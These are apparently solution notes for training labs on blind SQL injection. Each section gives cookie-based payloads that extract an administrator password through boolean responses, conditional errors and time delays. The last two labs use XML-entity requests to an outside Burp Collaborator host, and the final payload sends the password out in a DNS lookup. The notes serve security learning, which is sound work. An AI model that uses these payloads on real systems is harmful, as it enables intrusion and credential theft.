# Blind SQL injection

## Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

Target cookie request header:

```
Cookie: TrackingId=d3KGutgKOMjnh4xT
```

Target SQL query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'd3KGutgKOMjnh4xT'
```

Solution:

```sql
xyz' OR '1'='1
xyz' OR '1'='2
' UNION SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 19--
' UNION SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 20--
' UNION SELECT username FROM users WHERE username = 'administrator' AND SUBSTR(password, §§, 1) > '§§'--
```

Modified cookie request header:

```
Cookie: TrackingId='+UNION+SELECT+username+FROM+users+WHERE+username+=+'administrator'+AND+SUBSTR(password,+§§,+1)+>+'§§'--
```

## Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

Target cookie request header:

```
Cookie: TrackingId=CFO6j85RorXzU17G
```

Target SQL query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'CFO6j85RorXzU17G'
```

Solution:

```sql
' UNION SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 19) THEN TO_CHAR(1/0) ELSE NULL END FROM users--
' UNION SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 20) THEN TO_CHAR(1/0) ELSE NULL END FROM users--
' UNION SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, §§, 1) = '§§') THEN TO_CHAR(1/0) ELSE NULL END FROM users--
```

Modified cookie request header:

```
Cookie: TrackingId='+UNION+SELECT+CASE+WHEN+(username+=+'administrator'+AND+SUBSTR(password,+§§,+1)+=+'§§')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users--
```

## Blind SQL injection with time delays

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

Target cookie request header:

```
Cookie: TrackingId=GozlT53MXFfyOacv
```

Target SQL query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'GozlT53MXFfyOacv'
```

Solution:

```sql
' || PG_SLEEP(10)--
```

Modified cookie request header:

```
Cookie: TrackingId='+||+PG_SLEEP(10)--
```

## Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

Target cookie request header:

```
Cookie: TrackingId=t7j8rI6oMCaPTlEC
```

Target SQL query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 't7j8rI6oMCaPTlEC'
```

Solution:

```sql
'%3B SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, §§, 1) = '§§') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END FROM users--
```

Modified cookie request header:

```
Cookie: TrackingId='%3B+SELECT+CASE+WHEN+(username+=+'administrator'+AND+SUBSTR(password,+§§,+1)+=+'§§')+THEN+PG_SLEEP(5)+ELSE+PG_SLEEP(0)+END+FROM+users--
```

## Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Target cookie request header:

```
Cookie: TrackingId=TGK463hgRPbVUYFr
```

Target SQL query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'TGK463hgRPbVUYFr'
```

Solution:

```sql
' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://tfc8d4161a43yingegd9r8gtskyxcgwy01p.burpcollaborator.net/"> %remote;]>'), '/l') FROM dual--
```

Modified cookie request header:

```
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(XMLTYPE('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//tfc8d4161a43yingegd9r8gtskyxcgwy01p.burpcollaborator.net/">+%25remote%3B]>'),+'/l')+FROM+dual--
Cookie: TrackingId=7qoguswvlm7zqjsrl6rzd4zj56bcawvz
```

## Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

Target cookie request header:

```
Cookie: TrackingId=UvXJQOPrW2sZMTtQ
```

Target SQL query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'UvXJQOPrW2sZMTtQ'
```

Solution:

```sql
' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gl5wgwoxuglwbr0onhix816ngem4at.burpcollaborator.net/"> %remote;]>'), '/a') FROM dual--
' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username%3D'administrator')||'.gl5wgwoxuglwbr0onhix816ngem4at.burpcollaborator.net/"> %remote;]>'), '/abc') FROM dual--
```

Modified cookie request header:

```
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(XMLTYPE('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//'||(SELECT+password+FROM+users+WHERE+username%3D'administrator')||'.gl5wgwoxuglwbr0onhix816ngem4at.burpcollaborator.net/">+%25remote%3B]>'),+'/abc')+FROM+dual--
```